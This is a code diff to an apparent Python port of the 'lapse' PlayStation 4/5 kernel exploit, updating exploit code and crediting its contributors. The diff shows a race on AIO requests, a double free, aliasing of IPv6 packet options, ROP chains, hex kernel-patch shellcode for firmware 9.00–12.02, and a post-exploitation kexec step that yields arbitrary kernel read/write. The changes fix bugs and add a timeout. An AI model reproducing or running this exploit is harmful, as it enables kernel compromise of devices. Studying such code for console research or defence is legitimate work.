@@ -1,12 +1,24 @@
+"""
+Credits:
+- Helloyunho: It's me!
+- remote_lua_loader: This is basically a port of lapse.lua
+- cow: Gave a lot of hint to make this working
+- Gezine: Also gave a lot of hint to make this working
+- earthonion: For testing with me and giving advice
+- Dr. YenYen: For testing with me
+- Sajjad: Also for testing with me
+"""
+
 import struct
+import traceback
 from utils.ref import get_ref_addr
 from utils.etc import alloc, bytes
 from utils.unsafe import readuint, readbuf
 from utils.conversion import u64_to_i64, get_cstring
-from utils.rp import log
+from utils.rp import log, log_exc
 from sc import sc
 from ropchain import ROPChain, Executable
-from constants import SYSCALL, SELECTED_LIBC, nogc
+from constants import SYSCALL, SELECTED_LIBC, nogc, SELECTED_GADGETS
 from offsets import LIBC_OFFSETS
 
 
@@ -957,25 +969,35 @@ shellcode_1150 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffe
 shellcode_1200 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
 
 
+def fromhex(s):
+    hex_string = "0123456789abcdef"
+    return bytes(
+        [
+            hex_string.index(s[i].lower()) * 16 + hex_string.index(s[i + 1].lower())
+            for i in range(0, len(s), 2)
+        ]
+    )
+
+
 def get_kernel_patches_shellcode():
     if sc.version == "9.00":
-        return bytes.fromhex(shellcode_900)
+        return fromhex(shellcode_900)
     elif sc.version in ["9.03", "9.04"]:
-        return bytes.fromhex(shellcode_903)
+        return fromhex(shellcode_903)
     elif sc.version in ["9.50", "9.51", "9.60"]:
-        return bytes.fromhex(shellcode_950)
+        return fromhex(shellcode_950)
     elif sc.version in ["10.00", "10.01"]:
-        return bytes.fromhex(shellcode_1000)
+        return fromhex(shellcode_1000)
     elif sc.version in ["10.50", "10.70", "10.71"]:
-        return bytes.fromhex(shellcode_1050)
+        return fromhex(shellcode_1050)
     elif sc.version == "11.00":
-        return bytes.fromhex(shellcode_1100)
+        return fromhex(shellcode_1100)
     elif sc.version == "11.02":
-        return bytes.fromhex(shellcode_1102)
+        return fromhex(shellcode_1102)
     elif sc.version in ["11.50", "11.52"]:
-        return bytes.fromhex(shellcode_1150)
+        return fromhex(shellcode_1150)
     elif sc.version in ["12.00", "12.02"]:
-        return bytes.fromhex(shellcode_1200)
+        return fromhex(shellcode_1200)
     else:
         return None
 
@@ -991,12 +1013,14 @@ if SELECTED_KERNEL_VERSION_OFFSETS is None:
 
 SYSCALL["unlink"] = 0xA
 SYSCALL["pipe"] = 42
+SYSCALL["getpid"] = 20
 SYSCALL["getuid"] = 0x18
 SYSCALL["connect"] = 98
 SYSCALL["munmap"] = 0x49
 SYSCALL["mprotect"] = 0x4A
 SYSCALL["getsockopt"] = 0x76
 SYSCALL["socketpair"] = 0x87
+SYSCALL["nanosleep"] = 0xF0
 SYSCALL["sched_yield"] = 0x14B
 SYSCALL["thr_exit"] = 0x1AF
 SYSCALL["thr_self"] = 0x1B0
@@ -1255,7 +1279,9 @@ class PrimThread(object):
         jmp_buf = alloc(0x60)
 
         # skeleton jmp_buf
-        jmp_buf[0x0:0x8] = struct.pack("<Q", self.sc.exec_addr + self.sc.gadgets["ret"])
+        jmp_buf[0x0:0x8] = struct.pack(
+            "<Q", self.sc.exec_addr + SELECTED_GADGETS["ret"]
+        )
         jmp_buf[0x10:0x18] = struct.pack("<Q", self.chain.addr)
         jmp_buf[0x40:0x44] = struct.pack("<I", PrimThread.fpu_ctrl_value)
         jmp_buf[0x44:0x48] = struct.pack("<I", PrimThread.mxcsr_value)
@@ -1655,15 +1681,24 @@ def create_pipe():
     return pipe_read_fd, pipe_write_fd
 
 
-def wait_for(addr, val):
-    while True:
-        curr = readuint(addr, 8)
-        if curr == val:
-            break
+def nanosleep(nsec):
+    sec = nsec // 1000000000
+    nsec = nsec % 1000000000
+    req = alloc(16)
+    req[0:8] = struct.pack("<Q", sec)
+    req[8:16] = struct.pack("<Q", nsec)
+    sc.syscalls.nanosleep(req)
+
+
+def wait_for(addr, val, timeout=30000):
+    elapsed = 0
+    while readuint(addr, 8) != val and elapsed < timeout:
+        nanosleep(1)
+        elapsed += 1
 
 
 def build_rthdr(buf, size):
-    len = ((size >> 3) - 1) & 0xFFFFFFFE
+    len = ((size >> 3) - 1) & ~1
     size = (len + 1) << 3
 
     buf[0:1] = struct.pack("<B", 0)  # ip6r_nxt
@@ -1731,10 +1766,11 @@ def hexdump(data):
         log("{:08x}  {:<48}  {}".format(i, hex_bytes, ascii_bytes))
 
 
+suspend_exec = Executable(sc, 0xF000 * 4)
+
+
 def race_one(request_addr, tcp_sd, sds):
     reset_race_state()
-
-    hexdump(readbuf(id(None), 0x10))
 
     sce_errs = alloc(8)
     sce_errs[0:4] = struct.pack("<I", 0xFFFFFFFF)
@@ -1752,34 +1788,31 @@ def race_one(request_addr, tcp_sd, sds):
     thr = PrimThread(sc, delete_chain)
     thr_tid = thr.run()
     log("spawned worker thread: %s" % hex(thr_tid))
-    hexdump(readbuf(id(None), 0x10))
 
     # wait for the worker thread to ready
     wait_for(get_ref_addr(ready_signal), 1)
     log("worker thread ready")
 
-    suspend_chain = Executable(sc, 0xF000 * 4)
-    suspend_chain.chain.reset()
-    suspend_chain.setup_front_chain()
+    suspend_exec.chain.reset()
+    suspend_exec.setup_front_chain()
 
     # notify worker thread to resume
-    suspend_chain.setup_syscall_chain(SYSCALL["write"], pipe_write_fd, pipe_buf, 1)
+    suspend_exec.setup_syscall_chain(SYSCALL["write"], pipe_write_fd, pipe_buf, 1)
 
     # yield and hope the scheduler runs the worker next.
     # the worker will then sleep at soclose() and hopefully we run next
-    suspend_chain.setup_syscall_chain(SYSCALL["sched_yield"])
+    suspend_exec.setup_syscall_chain(SYSCALL["sched_yield"])
 
     # if we get here and the worker hasn't been reran then we can delay the
     # worker's execution of soclose() indefinitely
-    suspend_chain.setup_syscall_chain(SYSCALL["thr_suspend_ucontext"], thr_tid)
+    suspend_exec.setup_syscall_chain(SYSCALL["thr_suspend_ucontext"], thr_tid)
+    suspend_exec.setup_padding_chain()
 
-    suspend_chain.setup_post_chain()
-    suspend_chain.setup_back_chain()
-
-    suspend_res = suspend_chain.execute()
+    suspend_exec.setup_post_chain()
+    suspend_exec.setup_back_chain()
+    suspend_res = suspend_exec.execute()
 
     log("suspend %s: %d" % (hex(thr_tid), suspend_res))
-    hexdump(readbuf(id(None), 0x10))
 
     poll_err = alloc(4)
     aio_multi_poll(request_addr, 1, poll_err)
@@ -1809,6 +1842,7 @@ def race_one(request_addr, tcp_sd, sds):
     log("resume %s: %d" % (hex(thr_tid), result))
 
     wait_for(get_ref_addr(deletion_signal), 1)
+    print("deletion signal received")
 
     if won_race:
         err_main_thr = struct.unpack("<I", sce_errs[0:4])[0]
@@ -1985,7 +2019,7 @@ def verify_reqs2(addr, cmd):
     heap_prefixes = []
 
     # check if offsets 0x10 to 0x20 look like a kernel heap address
-    for i in range(0x10, 0x20, 8):
+    for i in range(0x10, 0x20 + 1, 8):
         if readuint(addr + i + 6, 2) != 0xFFFF:
             return False
         prefix = readuint(addr + i + 4, 2)
@@ -2005,7 +2039,7 @@ def verify_reqs2(addr, cmd):
         return False
 
     # check if offsets 0x48 to 0x50 look like a kernel address
-    for i in range(0x48, 0x50, 8):
+    for i in range(0x48, 0x50 + 1, 8):
         if readuint(addr + i + 6, 2) == 0xFFFF:
             # don't push kernel ELF addresses
             if readuint(addr + i + 4, 2) != 0xFFFF:
@@ -2064,7 +2098,7 @@ def leak_kernel_addrs(sd_pair, sds):
 
             val = struct.unpack("<I", buf[0:4])[0]
             if val == expected_flag:
-                evfs.remove(evf)
+                del evfs[idx]
             else:
                 evf = None
 
@@ -2167,7 +2201,7 @@ def leak_kernel_addrs(sd_pair, sds):
         sd_idx = None
         reqs2_off, fake_reqs3_off = None, None
 
-        for off in range(0, buflen - 1, 0x80):
+        for off in range(0x80, buflen, 0x80):
             if not reqs2_off and verify_reqs2(get_ref_addr(buf) + off, AIO_CMD_WRITE):
                 reqs2_off = off
             if not fake_reqs3_off:
@@ -2179,7 +2213,7 @@ def leak_kernel_addrs(sd_pair, sds):
         if reqs2_off and fake_reqs3_off:
             log("found reqs2 and fake reqs3 at attempt: %d" % (i + 1))
             fake_reqs3_sd = sds[sd_idx]
-            sds.remove(fake_reqs3_sd)
+            del sds[sd_idx]
             free_rthdrs(sds)
             sds.append(new_socket())
             break
@@ -2194,8 +2228,8 @@ def leak_kernel_addrs(sd_pair, sds):
 
     get_rthdr(sd, buf, buflen)
 
-    # TODO: write hex dump function for easier debugging
-    # log('leaked aio_entry:')
+    log("leaked aio_entry:")
+    hexdump(buf[reqs2_off : reqs2_off + 0x80])
 
     # store for curproc leak later
     aio_info_addr = struct.unpack("<Q", buf[reqs2_off + 0x18 : reqs2_off + 0x20])[0]
@@ -2261,26 +2295,27 @@ def make_aliased_pktopts(sds):
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
 
         for i in range(len(sds)):
-            if sds[i] != 0xFFFFFFFFFFFFFFFF:
-                gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
-                marker = struct.unpack("<I", tclass[0:4])[0]
-                if marker != i:
-                    sd_pair = (sds[i], sds[marker])
-                    log(
-                        "aliased pktopts at attempt: %d (found pair: %d %d)"
-                        % (loop, sd_pair[0], sd_pair[1])
+            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
+            marker = struct.unpack("<I", tclass[0:4])[0]
+            if marker != i:
+                sd_pair = (sds[i], sds[marker])
+                log(
+                    "aliased pktopts at attempt: %d (found pair: %d %d)"
+                    % (loop, sd_pair[0], sd_pair[1])
+                )
+                min_idx = min(marker, i)
+                max_idx = max(marker, i)
+                del sds[max_idx]
+                del sds[min_idx]
+                free_rthdrs(sds)
+                for _ in range(2):
+                    sock_fd = new_socket()
+                    ssockopt(
+                        sock_fd, IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4
                     )
-                    sds.remove(marker)
-                    sds.remove(i)
-                    free_rthdrs(sds)
-                    for _ in range(2):
-                        sock_fd = new_socket()
-                        ssockopt(
-                            sock_fd, IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4
-                        )
-                        sds.append(sock_fd)
+                    sds.append(sock_fd)
 
-                    return sd_pair
+                return sd_pair
 
         for sd in sds:
             ssockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
@@ -2358,15 +2393,17 @@ def double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_a
 
                 if req_idx != -1:
                     log(
-                        "states[%d] = %s",
-                        req_idx,
-                        hex(
-                            struct.unpack("<I", states[req_idx * 4 : req_idx * 4 + 4])[
-                                0
-                            ]
+                        "states[%d] = %s"
+                        % (
+                            req_idx,
+                            hex(
+                                struct.unpack(
+                                    "<I", states[req_idx * 4 : req_idx * 4 + 4]
+                                )[0]
+                            ),
                         ),
                     )
-                    log("found req_id at batch: %d", batch)
+                    log("found req_id at batch: %d" % batch)
                     log("aliased at attempt: %d" % (i + 1))
 
                     aio_idx = batch * num_elems + req_idx
@@ -2399,7 +2436,7 @@ def double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_a
 
     # enable deletion of target_id
     aio_multi_poll(get_ref_addr(target_id_p), 1, states)
-    log("target's state: %s", hex(struct.unpack("<I", states[0:4])[0]))
+    log("target's state: %s" % hex(struct.unpack("<I", states[0:4])[0]))
 
     sce_errs = alloc(8)
     sce_errs[0:4] = struct.pack("<I", 0xFFFFFFFF)
@@ -2431,7 +2468,7 @@ def double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_a
     states[0:4] = struct.pack("<I", 0xFFFFFFFF)
     states[4:8] = struct.pack("<I", 0xFFFFFFFF)
 
-    aio_multi_poll(get_ref_addr(target_id_p), 2, states)
+    aio_multi_poll(get_ref_addr(target_ids), 2, states)
     log(
         "target states: %s %s"
         % (
@@ -2621,7 +2658,7 @@ class IPv6KernelRW(object):
             mem = alloc(len)
 
         self.copyout(kaddr, get_ref_addr(mem), len)
-        return readbuf(mem, len)
+        return mem[:len]
 
     def write_buffer(self, kaddr, buf):
         self.copyin(get_ref_addr(buf), kaddr, len(buf))
@@ -2664,14 +2701,14 @@ class Kernel(object):
         return struct.unpack("<Q", value)[0]
 
     def read_null_terminated_string(self, kaddr):
-        result = b""
+        result = bytearray()
         while True:
             char = self.read_buffer(kaddr, 1)
-            if char == b"\0":
+            if char == 0 or char == b"\0":
                 break
             result += char
             kaddr += 1
-        return result
+        return str(result)
 
     def write_byte(self, kaddr, value):
         buf = struct.pack("<B", value)
@@ -3267,11 +3304,11 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
 
     pktopts_size = 0x100
     pktopts = alloc(pktopts_size)
-    rsize = build_rthdr(get_ref_addr(pktopts), pktopts_size)
-    pktinfo_p = k100_addr + 0x100
+    rsize = build_rthdr(pktopts, pktopts_size)
+    pktinfo_p = k100_addr + 0x10
 
     # pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
-    pktopts[off_tclass + 0x10 : off_tclass + 0x18] = struct.pack("<Q", pktinfo_p)
+    pktopts[0x10:0x18] = struct.pack("<Q", pktinfo_p)
 
     log("overwrite main pktopts")
     reclaim_sock = None
@@ -3292,7 +3329,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
             log("found reclaim sd at attempt: %d" % (i + 1))
             idx = marker >> 16
             reclaim_sock = sds_alt[idx]
-            sds_alt.remove(reclaim_sock)
+            del sds_alt[idx]
             break
 
     if reclaim_sock is None:
@@ -3310,7 +3347,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
 
         while offset < len:
             # pktopts.ip6po_nhinfo = addr + offset
-            pktinfo[0x8 : 0x8 + 8] = struct.pack("<Q", addr + offset)
+            pktinfo[0x8:0x10] = struct.pack("<Q", addr + offset)
 
             ssockopt(
                 master_sock,
@@ -3335,7 +3372,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
 
         return struct.unpack("<Q", read_buf[0:8])[0]
 
-    log('slow_kread8(&"evf cf"): %s' % hex(slow_kread8(kernel_addr)))
+    log('slow_kread8(&"evf cv"): %s' % hex(slow_kread8(kernel_addr)))
     kstr = get_cstring(read_buf)
     log('*(&"evf cv"): %s' % kstr)
 
@@ -3368,10 +3405,12 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
     )
     kernel.inside_kdata_addr = kernel_addr
 
+    log("curproc_fd = %s" % hex(kernel.curproc_fd_addr))
+    log("curproc_ofiles = %s" % hex(kernel.curproc_ofiles_addr))
+
     def get_fd_data_addr(sock, kread8_fn):
         filedescent_addr = (
-            kernel.curproc_ofiles_addr
-            + sock * SELECTED_KERNEL_OFFSETS["FILEDESC_OFILES"]
+            kernel.curproc_ofiles_addr + sock * SELECTED_KERNEL_OFFSETS["SIZEOF_OFILES"]
         )
         file_addr = kread8_fn(filedescent_addr)  # fde_file
         return kread8_fn(file_addr)  # f_data
@@ -3420,7 +3459,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
             worker_sock,
             IPPROTO_IPV6,
             IPV6_PKTINFO,
-            get_ref_addr(worker_pktinfo),
+            get_ref_addr(buf),
             pktinfo_len,
         )
 
@@ -3451,6 +3490,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
     kernel.write_buffer = ipv6_kernel_rw.write_buffer
 
     kstr = kernel.read_null_terminated_string(kernel_addr)
+    log('*(&"evf cv"): %s' % kstr)
     if kstr != "evf cv":
         raise Exception('test read of &"evf cv" failed')
 
@@ -3462,7 +3502,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
     off_ip6po_rthdr = 0x68 if sc.platform == "ps4" else 0x70
 
     for sd in sds:
-        sock_pktopts = get_sock_pktopts(sd, kread8)
+        sock_pktopts = get_sock_pktopts(sd, kernel.read_qword)
         kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0)
 
     reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword)
@@ -3558,7 +3598,7 @@ def post_exploitation_ps4():
         mapping_addr = 0x920100000
 
         sysent_661_addr = (
-            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["SYSCALL_661_OFFSET"]
+            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["SYSENT_661_OFFSET"]
         )
         sy_narg = kernel.read_dword(sysent_661_addr)
         sy_call = kernel.read_qword(sysent_661_addr + 8)
@@ -3588,7 +3628,7 @@ def post_exploitation_ps4():
             0,
         )
         sc.mem[mapping_addr - 0x1000 : mapping_addr - 0x1000 + len(bin_data)] = bin_data
-        log("First bytes: 0x%x", readuint(mapping_addr, 4))
+        log("First bytes: 0x%x" % readuint(mapping_addr, 4))
 
         sc.syscalls.kexec(mapping_addr)
 
@@ -3852,7 +3892,7 @@ def kexploit():
 
         log("[+] Get arbitrary kernel read/write")
         make_kernel_arw(
-            pktopts_sds, kbuf_addr, kernel_addr, sds, sds_alt, aio_info_addr
+            pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr
         )
 
         log("[+] Post exploitation")
@@ -3863,8 +3903,10 @@ def kexploit():
             post_exploitation_ps5()
 
         log("done!")
-    except Exception as e:
-        log("[-] Exploit failed: %s" % str(e))
+    except:
+        log("[-] Exploit failed")
+        exc_msg = traceback.format_exc()
+        log_exc(exc_msg)
     finally:
         sc.syscalls.close(block_fd)
         sc.syscalls.close(unblock_fd)
